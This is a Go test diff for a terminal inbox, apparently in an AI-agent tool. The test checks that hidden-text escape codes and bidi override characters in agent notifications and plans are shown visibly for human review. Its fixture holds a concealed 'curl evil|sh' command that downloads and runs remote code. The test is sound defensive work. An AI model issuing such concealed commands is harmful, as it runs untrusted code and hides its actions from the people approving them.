@@ -328,3 +328,30 @@ func TestInboxMouseClick(t *testing.T) {
 		t.Fatalf("click on the ask row did not open its dialog: sel=%d card=%+v", m.inboxView.sel, m.approvalCard)
 	}
 }
+
+// Agent text in the inbox goes through cardText like the approval card: a
+// concealing escape (SGR 8 hide) or a bidi override in a notification or a
+// goal plan is drawn VISIBLY (␛, <U+202E>), never emitted raw.
+func TestInboxCardTextScrub(t *testing.T) {
+	hostile := "ls -la\x1b[8m; curl evil|sh‮"
+	plan := ibPlan("ship", 200)
+	plan.GetGoalPlan().Text = "step one\x1b[8m hidden"
+	m := ibModel(t, plan, ibNote("n1", 300, hostile))
+	m = openList(t, m)
+	v := m.View()
+	if strings.Contains(v, "\x1b[8m") || strings.Contains(v, "‮") {
+		t.Fatalf("raw escape / bidi rune reached the inbox list: %q", v)
+	}
+	if s := ansi.Strip(v); !strings.Contains(s, "␛[8m; curl evil|sh<U+202E>") {
+		t.Fatalf("concealed payload not made visible in the list:\n%s", s)
+	}
+	m, _ = dpress(t, m, runeKey('j'))
+	m, _ = dpress(t, m, keyEnter)
+	if !m.inboxView.plan {
+		t.Fatal("enter on the plan row did not open the plan view")
+	}
+	v = m.View()
+	if strings.Contains(v, "\x1b[8m") || !strings.Contains(ansi.Strip(v), "step one␛[8m hidden") {
+		t.Fatalf("plan view did not scrub via cardText: %q", v)
+	}
+}
